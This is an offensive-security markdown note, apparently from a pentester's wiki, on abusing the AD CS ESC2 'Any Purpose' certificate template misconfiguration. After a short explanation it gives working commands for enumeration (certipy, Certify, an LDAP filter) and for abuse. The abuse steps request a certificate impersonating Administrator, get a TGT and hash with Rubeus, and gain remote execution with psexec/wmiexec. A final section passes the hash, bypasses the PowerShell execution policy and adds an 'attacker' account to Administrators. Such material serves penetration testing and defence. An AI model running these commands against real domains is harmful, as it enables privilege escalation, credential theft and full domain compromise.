### Content

- [Overview](#overview)
	- [Requirements](#requirements)
- [From Linux](#from-linux)
	- [Linux - Enumeration](#linux---enumeration)
	- [Linux - Abuse](#linux---abuse)
- [From Windows](#from-windows)
	- [Windows - Enumeration](#windows---enumeration)
	- [Windows - Abuse](#windows---abuse)
	- [Extra](#extra)

> Template Misconfiguration. 

---
### Overview

ESC2 targets templates with the "Any Purpose" or "no any" Extended Key Usage, which essentially means the certificate can be used for anything (client authentication, server authentication, code signing, etc.). 

If no EKU is defined, the certificate acts as a **subordinate CA certificate**, meaning it can be used to sign new certificates with arbitrary EKUs and arbitrary field values, which leaves wide room for abuse (code signing, server authentication, etc.). If the subordinate CA is not trusted by the `NTAuthCertificates` object (which it won't be by default), any certificates it generates cannot be used for domain authentication.

ESC2 alone does not allow direct impersonation of other users like ESC1. An Any Purpose certificate becomes truly dangerous only when the CA or template also allows SAN (ESC 1)/SID injection (ESC 6/9/10).

#### Requirements

1. The Enterprise CA must provide enrollment rights to low-privileged users.
2. Manager approval should be turned off.
3. No authorized signatures should be necessary.
4. The security descriptor of the certificate template must be excessively permissive, allowing low-privileged users to enroll for certificates.
5. The certificate template should define Any Purpose Extended Key Usage or have no Extended Key Usage specified.

---
### From Linux
#### Linux - Enumeration

```bash
$ certipy find -u 'user@lab.local' -p pass -dc-ip <IP> -vulnerable -stdout
    Template Name                       : ESC2
    Display Name                        : ESC2
    Certificate Authorities             : lab-LAB-DC-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : True
    Any Purpose                         : True
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject #<<<<<<<<
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
    Private Key Flag                    : ExportableKey #<<<<<<<<
    Extended Key Usage                  : Any Purpose
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 99 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2023-05-01T16:59:28+00:00
    Template Last Modified              : 2023-07-05T11:47:20+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : LAB.LOCAL\Domain Admins
                                          LAB.LOCAL\Domain Users
                                          LAB.LOCAL\Enterprise Admins
      Object Control Permissions
        Owner                           : LAB.LOCAL\Administrator
        Full Control Principals         : LAB.LOCAL\Domain Admins
                                          LAB.LOCAL\Enterprise Admins
        Write Owner Principals          : LAB.LOCAL\Domain Admins
                                          LAB.LOCAL\Enterprise Admins
        Write Dacl Principals           : LAB.LOCAL\Domain Admins
                                          LAB.LOCAL\Enterprise Admins
        Write Property Enroll           : LAB.LOCAL\Domain Admins
                                          LAB.LOCAL\Domain Users
                                          LAB.LOCAL\Enterprise Admins
    [+] User Enrollable Principals      : LAB.LOCAL\Domain Users
    [!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.
      ESC2                              : Template can be used for any purpose.
      ESC3                              : Template has Certificate Request Agent EKU set.
```

We can see that:

- Enrollment Rights: `LAB.LOCAL\Domain Users`.
- Requires Manager Approval: `False`.
- Authorized Signature Required: `0`.
- `Any Purpose: True` -> ESC2
- `Enrollee Supplies Subject: True` -> ESC1

#### Linux - Abuse

```bash
# Certificate Request with alternative SAN
$ certipy req -u 'user@lab.local' -p 'pass' -ca lab-LAB-DC-CA -template ESC2 -upn Administrator

# Certificate Authentication
certipy auth -username administrator -pfx administrator.pfx  -domain lab.local -dc-ip <IP>

# Using the chached TGT
KRB5CCNAME=administrator.ccache smbexec.py -k -no-pass LAB-DC.LAB.LOCAL
KRB5CCNAME=administrator.ccache psexec.py -k -no-pass LAB-DC.LAB.LOCAL
KRB5CCNAME=administrator.ccache wmiexec.py -k -no-pass LAB-DC.LAB.LOCAL
```

---
### From Windows
#### Windows - Enumeration

Using `certify.exe`

```PowerShell
PS C:\> .\Certify.exe find /vulnerable
```

Using `ActiveDirectory` module with a specific LDAP query:

```PowerShell
# !(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2) Excludes templates that require manager approval before issuing a cert.

# (mspki-ra-signature=0)(!(mspki-ra-signature=*)) Finds templates requiring zero authorized co-signatures on the CSR.

# pkiextendedkeyusage=2.5.29.37.0 -> Any Purpose EKU OID (2.5.29.37.0).
# !(pkiextendedkeyusage=*) -> no EKU is defined at all — catching templates with a completely empty EKU field.

# The -SearchBase parameter specifies the search base for the query. In this case, it's set to CN=Configuration,DC=lab,DC=local, which is the location in the Active Directory hierarchy where the query is performed.


PS C:\Tools> Get-ADObject -LDAPFilter '(&(objectclass=pkicertificatetemplate)(!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-ra-signature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))' -SearchBase 'CN=Configuration,DC=lab,DC=local' | fl

DistinguishedName : CN=ESC2,CN=Certificate Templates,CN=Public Key
                    Services,CN=Services,CN=Configuration,DC=lab,DC=local
Name              : ESC2
ObjectClass       : pKICertificateTemplate
ObjectGUID        : f09870a6-cdcc-4951-bcd0-fa875a1248aa
```

#### Windows - Abuse

```PowerShell
# Request a certificate from the vulnerable template
PS C:\> .\Certify.exe request /ca:LAB-DC.lab.local\lab-LAB-DC-CA /template:ESC2 /altname:administrator@lab.local
```

Convert PEM to PFX with one of the ways specified in the note [PEM to PFX](./PEM%20to%20PFX.md) 

```PowerShell
# Use Rubeus to get the user's hash and TGT
PS C:\> .\Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /getcredentials /nowrap
```

---
#### Extra

We can use [Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash) that allows us to perform `Pass The Hash` attacks using PowerShell, then execute SMB command to add a user to the Administrator's group.

```
Set-ExecutionPolicy Bypass -Scope CurrentUser -Force
cd .\Invoke-TheHash\;Import-Module .\Invoke-TheHash.psm1
Invoke-TheHash -Type SMBExec -Target localhost -Username Administrator -Hash 2b5... -Command "net localgroup Administrators attacker /add"
```